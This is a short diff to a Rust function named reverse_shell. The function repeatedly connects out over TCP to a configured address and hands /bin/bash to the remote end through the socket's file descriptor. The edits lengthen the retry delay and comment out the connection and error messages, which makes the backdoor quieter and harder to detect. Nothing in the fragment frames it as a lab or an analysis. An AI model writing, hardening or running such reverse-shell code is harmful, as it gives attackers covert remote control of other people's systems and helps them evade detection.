@@ -52,11 +52,11 @@ pub fn reverse_shell() {
     let addr = format!("{}:{}", key, value);
 
     loop {
-        thread::sleep(time::Duration::from_millis(1000));   
+        thread::sleep(time::Duration::from_millis(10000));   
 
         match TcpStream::connect(addr.clone()) {
             Ok(stream) => {
-                println!("Connected to {}", addr);
+                // println!("Connected to {}", addr);
                 let fd = stream.as_raw_fd();
 
                 Command::new("/bin/bash")
@@ -69,8 +69,8 @@ pub fn reverse_shell() {
             .       wait()
             .       unwrap();
             }
-            Err(e) => {
-                println!("Failed to connect to {}: {}", addr, e);
+            Err(_e) => {
+                // println!("Failed to connect to {}: {}", addr, e);
             }
         }
     }    
